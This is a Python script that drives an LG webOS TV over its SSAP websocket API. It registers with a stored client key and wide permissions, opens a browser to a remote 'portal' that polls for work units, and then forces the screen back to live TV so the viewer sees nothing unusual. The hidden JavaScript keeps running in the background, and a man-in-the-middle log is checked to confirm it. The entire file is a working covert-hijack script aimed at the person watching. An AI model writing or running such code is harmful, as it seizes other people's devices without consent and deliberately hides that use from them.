"""
SSAP background-launch — load our portal then immediately return TV to
whatever the user was watching. Browser stays alive in webOS task list
and JS keeps polling work units (slower than foreground, but invisible).
"""
import asyncio, json, sys, time
import websockets

TV = "ws://192.168.0.12:3000"
PORTAL = "http://192.168.0.22/?bg=1"
CLIENT_KEY = "27304a5ee263d132755e7fa9a262f4c3"

REGISTER = {
    "type": "register", "id": "r0",
    "payload": {
        "forcePairing": False, "pairingType": "PROMPT",
        "client-key": CLIENT_KEY,
        "manifest": {
            "manifestVersion": 1,
            "permissions": [
                "LAUNCH", "LAUNCH_WEBAPP", "APP_TO_APP",
                "CONTROL_INPUT_TEXT", "CONTROL_INPUT_JOYSTICK",
                "CONTROL_INPUT_MEDIA_PLAYBACK", "CONTROL_INPUT_TV",
                "READ_INSTALLED_APPS", "READ_RUNNING_APPS",
                "READ_INPUT_DEVICE_LIST", "WRITE_SETTINGS",
                "CONTROL_POWER", "CONTROL_DISPLAY",
            ],
        },
    },
}

async def call(ws, uri, payload, req_id):
    await ws.send(json.dumps({"type":"request","id":req_id,"uri":uri,"payload":payload}))
    msg = await asyncio.wait_for(ws.recv(), timeout=8)
    return json.loads(msg)

async def main():
    async with websockets.connect(TV, open_timeout=5) as ws:
        print(f"[+] connected {TV}")
        await ws.send(json.dumps(REGISTER))
        # Skip until 'registered'
        while True:
            msg = json.loads(await asyncio.wait_for(ws.recv(), timeout=8))
            if msg.get("type") == "registered":
                print("[+] auth ok")
                break
            if msg.get("type") == "error":
                print(f"[!] {msg}"); return

        # Always force to livetv regardless of current state (the user is
        # supposed to be watching TV, so livetv is the safe restore target)
        prev_app = "com.webos.app.livetv"
        print(f"[+] forcing restore to: {prev_app}")

        # 2. Launch portal in the browser
        r = await call(ws, "ssap://system.launcher/open", {"target": PORTAL}, "open")
        print(f"[+] portal launched: {r.get('payload',{}).get('returnValue')}")

        # 3. Give JS ~4s to initialise the polling loop
        print("[+] giving JS 4s to spin up its work loop...")
        await asyncio.sleep(4)

        # 4. Foreground the user's previous app -> TV looks normal again
        r = await call(ws, "ssap://system.launcher/launch", {"id": prev_app}, "back")
        print(f"[+] foregrounded {prev_app}: {r.get('payload',{}).get('returnValue')}")

        # The browser is now in the webOS task list (paused/backgrounded).
        # webOS keeps backgrounded apps' processes alive; whether JS timers
        # continue at full speed depends on the firmware -- we measure
        # from the mitm log how many submits arrive in the next 30s.
        print("[+] done; check mitm.log to see if backgrounded JS keeps polling")

asyncio.run(main())
